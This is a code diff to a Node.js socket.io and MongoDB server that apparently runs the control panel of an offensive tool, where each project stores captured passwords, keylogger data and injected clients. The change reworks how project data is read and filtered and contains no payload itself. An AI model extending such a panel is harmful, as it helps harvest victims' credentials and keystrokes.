@@ -368,22 +368,6 @@ MongoClient.connect(config.mongodb, function (err, db) {
         })
       })
     }
-    var getProjectCollection = (id, collection) => {
-      return new Promise((resolve, reject) => {
-        db.collection(collection, (err, col) => {
-          if (err) throw err
-          col.findOne({
-              for: id
-          }).then(doc => {
-            if (doc !== null) {
-              resolve(doc)
-            } else {
-              resolve(doc)
-            }
-          })
-        })
-      })
-    }
     var injectUpdate = () => {
       socket.emit('inject:clients', inject.clients[injectWatcher])
     }
@@ -543,20 +527,22 @@ MongoClient.connect(config.mongodb, function (err, db) {
 
     socket.on('project:read', project => {
       if (project.name && globalToken) {
-        if (project.type === 'overview' || project.type === 'passwords' || project.type === 'keylogger' || project.type === 'inject') {
+        if (project.type === 'overview' || project.type === 'passwords' || project.type === 'keylogger' || project.type === 'inject' || project.type === 'config') {
           getUser(globalToken).then(user => {
             getProject(project.name, user).then(thisProject => {
-              if (project.type === 'overview') {
+              if (project.type === 'overview' || project.type === 'config') {
+                // Remove the passwords, inject & keylogger from the cloned object
+                delete thisProject.doc.passwords
+                delete thisProject.doc.inject
+                delete thisProject.doc.keylogger
                 socket.emit('project:read', {
-                  type: 'overview',
+                  type: project.type,
                   doc: thisProject.doc
                 })
               } else {
-                getProjectCollection(thisProject.doc._id, project.type).then(collection => {
-                  socket.emit('project:read', {
-                    type: project.type,
-                    doc: thisProject.doc
-                  })
+                socket.emit('project:read', {
+                  type: project.type,
+                  doc: thisProject.doc[project.type]
                 })
               }
               prevState = JSON.stringify(thisProject.doc)
@@ -569,7 +555,7 @@ MongoClient.connect(config.mongodb, function (err, db) {
                   refresh = setInterval(() => {
                     getProject(project.name, user).then(thisProject => {
                       if (JSON.stringify(thisProject.doc) === prevState) return
-                      socket.emit('project:read', thisProject.doc)
+                      //socket.emit('project:read', thisProject.doc)
                       prevState = JSON.stringify(thisProject.doc)
                     }).catch(e => {
                       socket.emit('err', {
